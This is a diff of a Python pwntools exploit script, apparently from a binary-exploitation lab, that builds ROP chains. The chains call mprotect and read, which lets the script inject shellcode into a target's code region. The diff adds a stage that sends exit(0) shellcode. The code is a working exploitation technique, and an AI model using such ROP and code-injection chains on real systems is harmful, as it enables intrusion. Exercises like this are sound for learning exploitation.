@@ -93,7 +93,7 @@ def get_rop_addr():
     pop_rdx_ret = code_bytes_find(asm("pop rdx\nret")) + start_code_address
 
 
-def task1_byte():
+def exit_37_byte():
     global start_code_address, pop_rax_ret, pop_rdi_ret, syscall_ret
 
     send_line = flat(
@@ -187,6 +187,15 @@ def mprotect_read_byte():
     return send_line
 
 
+def get_asm_put_onto_codeint():
+    send_line = flat(
+        asm("""mov rax, 60
+        mov rdi, 0
+        syscall""")
+    )
+    return send_line
+
+
 if __name__ == '__main__':
     r = None
     if 'qemu' in sys.argv[1:]:
@@ -213,10 +222,10 @@ if __name__ == '__main__':
     gen_random_code_bytes()
     get_rop_addr()
 
-    # send_line = task1_byte()
+    # send_line = exit_37_byte()
     # [first send] -> mprotect & read from user input
     send_line = mprotect_read_byte()
-    # send_line += task1_byte()
+    # send_line += exit_37_byte()
     # print("send_line_1: ", send_line)
     
     r.send(send_line)
@@ -228,7 +237,7 @@ if __name__ == '__main__':
     print(r.recv())
 
     # [second send] -> input the asm we want to execute and it will be store into the start of codeint
-    send_line_2 = task1_byte()
+    send_line_2 = get_asm_put_onto_codeint()
     print("send_line_2 to read: ", send_line_2)
     r.send(send_line_2)
 
